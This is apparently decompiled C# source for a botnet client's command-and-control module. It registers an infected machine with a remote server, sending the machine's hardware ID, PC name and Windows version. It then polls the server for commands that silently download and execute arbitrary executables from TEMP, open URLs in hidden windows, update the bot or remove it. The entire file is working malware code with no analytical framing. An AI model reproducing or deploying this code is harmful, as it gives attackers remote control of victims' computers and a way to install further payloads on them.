using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Helper;

internal class cControl
{
	private string sOldCommand = string.Empty;

	public void ConnectControl()
	{
		registerCCHelper();
		Thread thread = new Thread(getCCCommand);
		thread.Start();
	}

	private void registerCCHelper()
	{
		string parameters = "mode=0&hwid=" + cMain.ConfigClass.sHWID + "&botver=" + cMain.ConfigClass.sBotVersion + "&pcname=" + cMain.ConfigClass.sPCName + "&winver=" + cMain.ConfigClass.sWinVersion;
		while (true)
		{
			try
			{
				string text = myHTTPRequest(cMain.ConfigClass.sCServerAddress, parameters);
				if (text.Length > 0)
				{
					if (text == cMain.ConfigClass.sAuthCode)
					{
						break;
					}
					Environment.Exit(-1);
				}
			}
			catch
			{
			}
			Thread.Sleep(cMain.ConfigClass.iConnectionInterval * 60 * 1000);
		}
	}

	private void getCCCommand()
	{
		string parameters = "mode=1&hwid=" + cMain.ConfigClass.sHWID;
		while (true)
		{
			try
			{
				string text = myHTTPRequest(cMain.ConfigClass.sCServerAddress, parameters);
				if (text.Length > 0)
				{
					if (text != sOldCommand)
					{
						handlemyCommand(text);
						sOldCommand = text;
					}
				}
				else
				{
					sOldCommand = string.Empty;
				}
			}
			catch
			{
			}
			Thread.Sleep(cMain.ConfigClass.iConnectionInterval * 60 * 1000);
		}
	}

	private string myHTTPRequest(string URI, string Parameters)
	{
		ServicePointManager.Expect100Continue = false;
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(URI);
		httpWebRequest.ContentType = "application/x-www-form-urlencoded";
		httpWebRequest.Method = "POST";
		httpWebRequest.UserAgent = cMain.ConfigClass.sAuthCode;
		byte[] bytes = Encoding.ASCII.GetBytes(Parameters);
		httpWebRequest.ContentLength = bytes.Length;
		Stream requestStream = httpWebRequest.GetRequestStream();
		requestStream.Write(bytes, 0, bytes.Length);
		requestStream.Close();
		WebResponse response = httpWebRequest.GetResponse();
		if (response == null)
		{
			return string.Empty;
		}
		StreamReader streamReader = new StreamReader(response.GetResponseStream());
		return streamReader.ReadToEnd().Trim();
	}

	private void handlemyCommand(string sCommand)
	{
		//IL_00eb: Unknown result type (might be due to invalid IL or missing references)
		//IL_011c: Unknown result type (might be due to invalid IL or missing references)
		string[] array = new string[0];
		try
		{
			array = sCommand.Split(new char[1] { '*' });
		}
		catch
		{
		}
		switch (array[0])
		{
		case "msgbox":
			try
			{
				if (Convert.ToString(array[1]) != null)
				{
					MessageBox.Show(Convert.ToString(array[1]), "Information", (MessageBoxButtons)0, (MessageBoxIcon)64);
				}
				else if (Convert.ToString(array[1]) == cMain.ConfigClass.sHWID)
				{
					MessageBox.Show(Convert.ToString(array[1]), "Information", (MessageBoxButtons)0, (MessageBoxIcon)64);
				}
				break;
			}
			catch
			{
				break;
			}
		case "downloadall":
			try
			{
				string text = cMain.FunctionClass.genString(new Random().Next(5, 12)) + ".exe";
				new WebClient().DownloadFile(Convert.ToString(array[1]), Environment.GetEnvironmentVariable("TEMP") + "\\" + text);
				Process process = new Process();
				process.StartInfo.FileName = Environment.GetEnvironmentVariable("TEMP") + "\\" + text;
				process.Start();
				break;
			}
			catch
			{
				break;
			}
		case "download":
			try
			{
				if (array[2] == cMain.ConfigClass.sHWID)
				{
					string text2 = cMain.FunctionClass.genString(new Random().Next(5, 12)) + ".exe";
					new WebClient().DownloadFile(Convert.ToString(array[1]), Environment.GetEnvironmentVariable("TEMP") + "\\" + text2);
					Process process = new Process();
					process.StartInfo.FileName = Environment.GetEnvironmentVariable("TEMP") + "\\" + text2;
					process.Start();
				}
				break;
			}
			catch
			{
				break;
			}
		case "visit":
			try
			{
				if (array[2] == cMain.ConfigClass.sHWID)
				{
					Process process = new Process();
					process.StartInfo = new ProcessStartInfo(Convert.ToString(array[1]));
					process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					process.Start();
				}
				break;
			}
			catch
			{
				break;
			}
		case "visitall":
			try
			{
				Process process = new Process();
				process.StartInfo = new ProcessStartInfo(Convert.ToString(array[1]));
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.Start();
				break;
			}
			catch
			{
				break;
			}
		case "update":
			cMain.SystemClass.updateHelper(Convert.ToString(array[1]));
			break;
		case "remove":
			if (array[1] == Environment.MachineName || array[1].ToUpper() == "ALL")
			{
				cMain.SystemClass.RemoveHelper();
			}
			break;
		}
	}
}
